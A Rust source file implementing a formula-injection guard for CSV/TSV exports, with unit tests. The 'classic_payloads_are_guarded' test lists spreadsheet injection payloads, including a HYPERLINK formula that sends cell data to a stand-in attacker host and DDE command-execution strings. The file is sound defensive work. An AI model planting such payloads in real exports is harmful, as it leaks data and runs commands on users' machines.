//! Formula-injection guard for delimited-text exports (CSV / TSV).
//!
//! A cell whose text starts with `=`, `+`, `-`, `@`, a tab, or a carriage
//! return is evaluated as a formula when the file is opened in Excel,
//! LibreOffice, or Google Sheets — the "CSV injection" attack, where a value
//! stored in the database runs on the machine of whoever opens the export.
//! Every delimited writer in the workspace (desktop app exports, clipboard
//! copies, the CLI's CSV output) routes text cells through [`guard_text`] so
//! the rule is defined exactly once.
//!
//! The guard is a leading apostrophe (`'`), the same answer OWASP, GitHub and
//! Google Sheets give: the apostrophe stays visible in the cell, which is a
//! cost paid only on values a spreadsheet would otherwise execute. Plain
//! numbers are exempt — `-12.5` and `+3` carry no operator, call, or cell
//! reference, so there is nothing for a spreadsheet to evaluate but the number
//! itself. Only *text* cells are ever guarded; callers must not pass the
//! rendering of a numeric, boolean, date, or binary value.

use std::borrow::Cow;

/// The characters a spreadsheet reads as the start of a formula. `\t` and
/// `\r` are included because a spreadsheet consumes them before judging the
/// next character, so they smuggle a formula past a check on position 0.
pub const FORMULA_TRIGGERS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

/// The prefix written in front of a guarded cell.
pub const FORMULA_GUARD_PREFIX: char = '\'';

/// True when `text` begins with one of [`FORMULA_TRIGGERS`].
pub fn starts_with_formula_trigger(text: &str) -> bool {
    text.chars()
        .next()
        .is_some_and(|first| FORMULA_TRIGGERS.contains(&first))
}

/// True when `text` is a number and nothing else: an optional leading sign,
/// digits with at most one decimal point (either side may be empty but not
/// both), and an optional exponent. Anchored at both ends, so `-1+1` and
/// `=1` are not plain numbers.
pub fn is_plain_number(text: &str) -> bool {
    let bytes = text.as_bytes();
    let mut i = 0;
    if matches!(bytes.first(), Some(b'+') | Some(b'-')) {
        i += 1;
    }
    let int_start = i;
    while i < bytes.len() && bytes[i].is_ascii_digit() {
        i += 1;
    }
    let int_digits = i - int_start;
    let mut frac_digits = 0;
    if i < bytes.len() && bytes[i] == b'.' {
        i += 1;
        let frac_start = i;
        while i < bytes.len() && bytes[i].is_ascii_digit() {
            i += 1;
        }
        frac_digits = i - frac_start;
    }
    if int_digits == 0 && frac_digits == 0 {
        return false;
    }
    if i < bytes.len() && (bytes[i] == b'e' || bytes[i] == b'E') {
        i += 1;
        if matches!(bytes.get(i), Some(b'+') | Some(b'-')) {
            i += 1;
        }
        let exp_start = i;
        while i < bytes.len() && bytes[i].is_ascii_digit() {
            i += 1;
        }
        if i == exp_start {
            return false;
        }
    }
    i == bytes.len()
}

/// True when a text cell with this content must be guarded before it is
/// written to a delimited file: it starts with a formula trigger and is not
/// a plain number.
pub fn needs_formula_guard(text: &str) -> bool {
    starts_with_formula_trigger(text) && !is_plain_number(text)
}

/// The text of a *text* cell as it should be written to a delimited file:
/// unchanged unless it would be read as a formula, in which case it gains a
/// leading apostrophe. Borrows when nothing changes.
pub fn guard_text(text: &str) -> Cow<'_, str> {
    if needs_formula_guard(text) {
        let mut out = String::with_capacity(text.len() + 1);
        out.push(FORMULA_GUARD_PREFIX);
        out.push_str(text);
        Cow::Owned(out)
    } else {
        Cow::Borrowed(text)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_trigger_character_is_guarded() {
        for trigger in FORMULA_TRIGGERS {
            let text = format!("{trigger}cmd");
            assert!(needs_formula_guard(&text), "{text:?} should be guarded");
            assert_eq!(guard_text(&text), format!("'{trigger}cmd"));
        }
    }

    #[test]
    fn classic_payloads_are_guarded() {
        for payload in [
            "=1+1",
            "=HYPERLINK(\"http://attacker/\"&A1)",
            "+cmd|' /C calc'!A0",
            "-2+3+cmd|' /C calc'!A0",
            "@SUM(1+9)",
            "\t=1+1",
            "\r=1+1",
            "-1+1",
            "-1-2",
            "=",
            "+",
            "-",
            "@",
        ] {
            assert!(needs_formula_guard(payload), "{payload:?}");
            assert!(guard_text(payload).starts_with('\''), "{payload:?}");
        }
    }

    #[test]
    fn plain_numbers_are_exempt() {
        for number in [
            "-12.5", "+3", "-3", "+0.5", "-.5", "+7.", "-1e10", "+1.5E-3", "-0", "+00012",
        ] {
            assert!(is_plain_number(number), "{number:?} is a plain number");
            assert!(
                !needs_formula_guard(number),
                "{number:?} must not be guarded"
            );
            assert!(matches!(guard_text(number), Cow::Borrowed(_)));
        }
    }

    #[test]
    fn not_plain_numbers() {
        for text in [
            "-1+1", "-1-2", "-1.2.3", "-", "+", "-.", "-e5", "-1e", "-1e+", "- 1", "-1 ", "-1,000",
            "-$5", "=1", "-1x", "--1",
        ] {
            assert!(!is_plain_number(text), "{text:?} is not a plain number");
        }
    }

    #[test]
    fn ordinary_text_is_untouched_and_borrowed() {
        for text in [
            "hello", "", "a=b", "1+1", "12", "0.5", "x@y.com", " =1", "'=1",
        ] {
            assert!(!needs_formula_guard(text), "{text:?}");
            assert!(matches!(guard_text(text), Cow::Borrowed(_)), "{text:?}");
        }
    }

    #[test]
    fn unicode_first_character_is_not_a_trigger() {
        assert!(!needs_formula_guard("é=1"));
        assert!(!needs_formula_guard("−1")); // U+2212 minus sign
    }
}
